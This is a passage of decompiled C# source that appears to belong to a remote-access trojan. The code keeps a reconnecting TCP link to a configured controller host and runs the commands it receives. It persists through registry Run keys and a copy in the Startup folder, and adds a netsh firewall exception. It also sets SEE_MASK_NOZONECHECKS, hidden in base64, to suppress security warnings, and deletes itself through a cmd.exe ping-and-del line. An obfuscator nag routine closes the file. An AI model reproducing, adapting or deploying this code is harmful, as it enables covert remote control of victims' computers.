					if (Operators.ConditionalCompareObjectGreater(NewLateBinding.LateGet(object_2, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)0, false))
					{
						byte[] array = new byte[Conversions.ToInteger(Operators.SubtractObject(NewLateBinding.LateGet(object_2, (Type)null, "Available", new object[0], (string[])null, (Type[])null, (bool[])null), (object)1)) + 1];
						object obj2 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[4]
						{
							array,
							0,
							array.Length,
							SocketFlags.None
						};
						object[] array3 = array2;
						bool[] array4 = new bool[4] { true, false, false, false };
						NewLateBinding.LateCall(obj2, (Type)null, "Receive", array3, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
						}
						object obj3 = obj;
						array2 = new object[3] { array, 0, array.Length };
						object[] array5 = array2;
						array4 = new bool[3] { true, false, false };
						NewLateBinding.LateCall(obj3, (Type)null, "Write", array5, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							array = (byte[])Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(byte[]));
						}
						while (true)
						{
							object obj4 = obj;
							array = (byte[])NewLateBinding.LateGet(obj4, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null);
							string text = method_10(ref array);
							NewLateBinding.LateSetComplex(obj4, (Type)null, "ToArray", new object[1] { array }, (string[])null, (Type[])null, true, false);
							if (text.Contains(string_9))
							{
								Array array6 = method_11((byte[])NewLateBinding.LateGet(obj, (Type)null, "ToArray", new object[0], (string[])null, (Type[])null, (bool[])null), string_9);
								Thread thread = new Thread(delegate(object object_4)
								{
									method_21((byte[])object_4);
								});
								thread.Start(RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array6, new object[1] { 0 }, (string[])null)));
								NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
								obj = new MemoryStream();
								if (array6.Length == 2)
								{
									object obj5 = obj;
									object[] array7 = new object[3];
									object[] array8 = array7;
									array2 = new object[1];
									object[] array9 = array2;
									int num2 = 1;
									array9[0] = 1;
									array8[0] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateIndexGet((object)array6, array2, (string[])null));
									array7[1] = 0;
									object[] array10 = array7;
									object[] array11 = new object[1];
									array2 = array11;
									object[] array12 = array2;
									int num3 = 0;
									obj4 = 1;
									array12[0] = RuntimeHelpers.GetObjectValue(obj4);
									object[] array13 = array2;
									string[] array14 = null;
									array10[2] = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(NewLateBinding.LateIndexGet((object)array6, array13, array14), (Type)null, "length", new object[0], (string[])null, (Type[])null, (bool[])null));
									array7 = array7;
									object[] array15 = array7;
									array4 = new bool[3] { true, false, true };
									NewLateBinding.LateCall(obj5, (Type)null, "Write", array15, (string[])null, (Type[])null, array4, true);
									if (array4[0])
									{
										NewLateBinding.LateIndexSetComplex((object)array6, new object[2]
										{
											num2,
											RuntimeHelpers.GetObjectValue(array7[0])
										}, (string[])null, true, false);
									}
									if (array4[2])
									{
										array2 = array11;
										array2[num3] = RuntimeHelpers.GetObjectValue(obj4);
										NewLateBinding.LateSetComplex(NewLateBinding.LateIndexGet((object)array6, array13, array14), (Type)null, "length", new object[1] { RuntimeHelpers.GetObjectValue(array7[2]) }, (string[])null, (Type[])null, true, true);
									}
									continue;
								}
								break;
							}
							break;
						}
					}
					goto IL_0760;
					end_IL_0008:;
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				while (true)
				{
					bool_2 = false;
					try
					{
						NewLateBinding.LateCall(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Disconnect", new object[1] { false }, (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					try
					{
						NewLateBinding.LateCall(obj, (Type)null, "Dispose", new object[0], (string[])null, (Type[])null, (bool[])null, true);
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					obj = new MemoryStream();
					try
					{
						NewLateBinding.LateCall(object_1, (Type)null, "Kill", new object[0], (string[])null, (Type[])null, (bool[])null, true);
						object_1 = null;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					try
					{
						object_2 = new TcpClient();
						NewLateBinding.LateSet(object_2, (Type)null, "ReceiveTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, "SendTimeout", new object[1] { -1 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSet(object_2, (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "SendBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						NewLateBinding.LateSetComplex(NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "ReceiveBufferSize", new object[1] { 999999 }, (string[])null, (Type[])null, false, true);
						num = 0;
						object obj6 = NewLateBinding.LateGet(object_2, (Type)null, "Client", new object[0], (string[])null, (Type[])null, (bool[])null);
						object[] array2 = new object[2] { string_6, string_7 };
						object[] array16 = array2;
						bool[] array4 = new bool[2] { true, true };
						NewLateBinding.LateCall(obj6, (Type)null, "Connect", array16, (string[])null, (Type[])null, array4, true);
						if (array4[0])
						{
							string_6 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[0]), typeof(string));
						}
						if (array4[1])
						{
							string_7 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array2[1]), typeof(string));
						}
						bool_2 = true;
						method_25(method_4());
						try
						{
							if (Operators.CompareString(method_2("us"), "!", false) == 0)
							{
								method_25("us");
							}
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							bool_2 = false;
							ProjectData.ClearProjectError();
						}
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						Thread.Sleep(2500);
						ProjectData.ClearProjectError();
						continue;
					}
					break;
				}
				continue;
				IL_0760:
				Thread.Sleep(1);
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_27()
	{
		method_23(0);
		gclass2_0.method_1();
		try
		{
			object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array;
			object[] array2 = (array = new object[2]);
			array2[0] = string_10;
			array2[1] = true;
			array = array2;
			bool[] array3;
			bool[] array4 = (array3 = new bool[2]);
			array4[0] = true;
			array4[1] = false;
			object obj2 = NewLateBinding.LateGet(obj, (Type)null, "OpenSubKey", array2, (string[])null, (Type[])null, array4);
			if (array3[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array5 = (array = new object[2]);
			array5[0] = string_5;
			array5[1] = false;
			array = array5;
			bool[] array6 = (array3 = new bool[2]);
			array6[0] = true;
			array6[1] = false;
			NewLateBinding.LateCall(obj2, (Type)null, "DeleteValue", array5, (string[])null, (Type[])null, array6, true);
			if (array3[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj3 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array;
			object[] array7 = (array = new object[2]);
			array7[0] = string_10;
			array7[1] = true;
			array = array7;
			bool[] array3;
			bool[] array8 = (array3 = new bool[2]);
			array8[0] = true;
			array8[1] = false;
			object obj4 = NewLateBinding.LateGet(obj3, (Type)null, "OpenSubKey", array7, (string[])null, (Type[])null, array8);
			if (array3[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array9 = (array = new object[2]);
			array9[0] = string_5;
			array9[1] = false;
			array = array9;
			bool[] array10 = (array3 = new bool[2]);
			array10[0] = true;
			array10[1] = false;
			NewLateBinding.LateCall(obj4, (Type)null, "DeleteValue", array9, (string[])null, (Type[])null, array10, true);
			if (array3[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall delete allowedprogram \"", NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"')), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj5 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array;
			object[] array11 = (array = new object[2]);
			array11[0] = "Software";
			array11[1] = true;
			object obj6 = NewLateBinding.LateGet(obj5, (Type)null, "OpenSubKey", array11, (string[])null, (Type[])null, (bool[])null);
			object[] array12 = (array = new object[2]);
			array12[0] = string_5;
			array12[1] = false;
			array = array12;
			bool[] array3;
			bool[] array13 = (array3 = new bool[2]);
			array13[0] = true;
			array13[1] = false;
			NewLateBinding.LateCall(obj6, (Type)null, "DeleteSubKey", array12, (string[])null, (Type[])null, array13, true);
			if (array3[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"cmd.exe /k ping 0 & del \"", NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" & exit")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	private bool method_28(FileInfo fileInfo_0, FileInfo fileInfo_1)
	{
		if (Operators.CompareString(fileInfo_0.get_Name().ToLower(), fileInfo_1.get_Name().ToLower(), false) == 0)
		{
			DirectoryInfo directoryInfo = fileInfo_0.Directory;
			DirectoryInfo directoryInfo2 = fileInfo_1.Directory;
			while (Operators.CompareString(directoryInfo.get_Name().ToLower(), directoryInfo2.get_Name().ToLower(), false) == 0)
			{
				DirectoryInfo directoryInfo3 = (directoryInfo = directoryInfo.Parent);
				directoryInfo2 = directoryInfo2.Parent;
				if (!(directoryInfo3 == null && directoryInfo2 == null))
				{
					if (directoryInfo == null || directoryInfo2 == null)
					{
						break;
					}
					continue;
				}
				return true;
			}
		}
		return false;
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public void method_29()
	{
		if (!method_28((FileInfo)object_0, new FileInfo(Interaction.Environ(string_4).ToLower() + "\\" + this.string_3.ToLower())))
		{
			try
			{
				if (Operators.CompareString(method_2("us"), "", false) == 0)
				{
					object obj = NewLateBinding.LateGet(NewLateBinding.LateGet(object_0, (Type)null, "Directory", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null);
					object[] array;
					object[] array2 = (array = new object[1]);
					array2[0] = ":";
					object string_;
					object string_2;
					if (Conversions.ToBoolean(NewLateBinding.LateGet(obj, (Type)null, "Contains", array2, (string[])null, (Type[])null, (bool[])null)))
					{
						string_ = "US";
						string_2 = "!";
					}
					else
					{
						string_ = "US";
						string_2 = "@";
					}
					method_3((string)string_, (string)string_2);
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
			try
			{
				string string_3 = "U0VFX01BU0tfTk9aT05FQ0hFQ0tT";
				Environment.SetEnvironmentVariable(method_7(ref string_3), "1", EnvironmentVariableTarget.User);
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (File.Exists(Interaction.Environ(string_4) + "\\" + this.string_3))
				{
					File.Delete(Interaction.Environ(string_4) + "\\" + this.string_3);
				}
				File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Interaction.Environ(string_4) + "\\" + this.string_3, overwrite: true);
				Process.Start(Interaction.Environ(string_4) + "\\" + this.string_3);
				ProjectData.EndApp();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.EndApp();
				ProjectData.ClearProjectError();
			}
		}
		try
		{
			Interaction.Shell(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)"netsh firewall add allowedprogram \"", NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" "), (object)'"'), NewLateBinding.LateGet(object_0, (Type)null, "Name", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ENABLE")), (AppWinStyle)0, false, -1);
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj2 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "CurrentUser", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array;
			object[] array3 = (array = new object[2]);
			array3[0] = string_10;
			array3[1] = true;
			array = array3;
			bool[] array4;
			bool[] array5 = (array4 = new bool[2]);
			array5[0] = true;
			array5[1] = false;
			object obj3 = NewLateBinding.LateGet(obj2, (Type)null, "OpenSubKey", array3, (string[])null, (Type[])null, array5);
			if (array4[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array6 = (array = new object[2]);
			array6[0] = string_5;
			array6[1] = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..");
			array = array6;
			bool[] array7 = (array4 = new bool[2]);
			array7[0] = true;
			array7[1] = false;
			NewLateBinding.LateCall(obj3, (Type)null, "SetValue", array6, (string[])null, (Type[])null, array7, true);
			if (array4[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			object obj4 = NewLateBinding.LateGet(NewLateBinding.LateGet(object_3, (Type)null, "Registry", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "LocalMachine", new object[0], (string[])null, (Type[])null, (bool[])null);
			object[] array;
			object[] array8 = (array = new object[2]);
			array8[0] = string_10;
			array8[1] = true;
			array = array8;
			bool[] array4;
			bool[] array9 = (array4 = new bool[2]);
			array9[0] = true;
			array9[1] = false;
			object obj5 = NewLateBinding.LateGet(obj4, (Type)null, "OpenSubKey", array8, (string[])null, (Type[])null, array9);
			if (array4[0])
			{
				string_10 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
			object[] array10 = (array = new object[2]);
			array10[0] = string_5;
			array10[1] = Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)'"', NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), (object)'"'), (object)" ..");
			array = array10;
			bool[] array11 = (array4 = new bool[2]);
			array11[0] = true;
			array11[1] = false;
			NewLateBinding.LateCall(obj5, (Type)null, "SetValue", array10, (string[])null, (Type[])null, array11, true);
			if (array4[0])
			{
				string_5 = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
			}
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
		try
		{
			File.Copy(Conversions.ToString(NewLateBinding.LateGet(object_0, (Type)null, "FullName", new object[0], (string[])null, (Type[])null, (bool[])null)), Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + string_5 + ".exe", overwrite: true);
		}
		catch (Exception projectError7)
		{
			ProjectData.SetProjectError(projectError7);
			ProjectData.ClearProjectError();
		}
		Thread.Sleep(1000);
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_30(object sender, SessionEndingEventArgs e)
	{
		method_17();
	}

	[SpecialName]
	[CompilerGenerated]
	[DebuggerStepThrough]
	private void method_31(object sender, EventArgs e)
	{
		method_20();
	}

	[SpecialName]
	[DebuggerStepThrough]
	[CompilerGenerated]
	private void method_32(object object_4)
	{
		method_21((byte[])object_4);
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern int MessageBox(IntPtr intptr_0, string string_11, string string_12, int int_0);

	public static void smethod_0()
	{
		string text = Path.Combine(Path.GetTempPath(), "e653d73e45833b6c");
		string text2;
		if (File.Exists(text2 = text))
		{
			byte[] array = File.ReadAllBytes(text);
			text = text2;
			if (array.Length >= 8)
			{
				if (DateTime.UtcNow - DateTime.FromBinary(((long)(array[6] ^ 0xF1) << 40) | (((long)(array[2] ^ 0xE4) << 56) | (((long)(array[3] ^ 0xED) << 0) | (((long)(array[7] ^ 0x21) << 32) | (((long)(array[5] ^ 0xF9) << 48) | (((long)(array[4] ^ 0xD2) << 24) | (((long)(array[0] ^ 0x1F) << 8) | ((long)(array[1] ^ 0x11) << 16)))))))) < TimeSpan.FromDays(7.0))
				{
					return;
				}
				goto IL_013b;
			}
		}
		long num = DateTime.UtcNow.ToBinary();
		File.WriteAllBytes(text, new byte[8]
		{
			(byte)((byte)(num >> 8) ^ 0x1Fu),
			(byte)((byte)(num >> 16) ^ 0x11u),
			(byte)((byte)(num >> 56) ^ 0xE4u),
			(byte)((byte)(num >> 0) ^ 0xEDu),
			(byte)((byte)(num >> 24) ^ 0xD2u),
			(byte)((byte)(num >> 48) ^ 0xF9u),
			(byte)((byte)(num >> 40) ^ 0xF1u),
			(byte)((byte)(num >> 32) ^ 0x21u)
		});
		goto IL_013b;
		IL_013b:
		string arg;
		try
		{
			arg = ((AssemblyTitleAttribute)Assembly.GetEntryAssembly()!.GetCustomAttributes(typeof(AssemblyTitleAttribute), inherit: false)[0]).Title;
		}
		catch
		{
			arg = "<unknown>";
		}
		string arg2;
		try
		{
			arg2 = ((AssemblyCompanyAttribute)Assembly.GetEntryAssembly()!.GetCustomAttributes(typeof(AssemblyCompanyAttribute), inherit: false)[0]).Company;
		}
		catch
		{
			arg2 = "<unknown>";
		}
		string arg3;
		try
		{
			arg3 = Assembly.GetEntryAssembly()!.Location;
		}
		catch
		{
			arg3 = "<unknown>";
		}
		IntPtr zero = IntPtr.Zero;
		string string_ = $"Application name: {arg}\nDeveloper name: {arg2}\nExecutable file: {arg3}\n\nThis program has been protected by an evaluation version of Rummage. If you didn't expect this message, please contact the developer of the program. Feel free to email info@aldaray.com if you are unsure how to get rid of this message.";
		Thread.Sleep(14789);
		MessageBox(zero, string_, "Rummage .NET Obfuscator", 65584);
	}
}
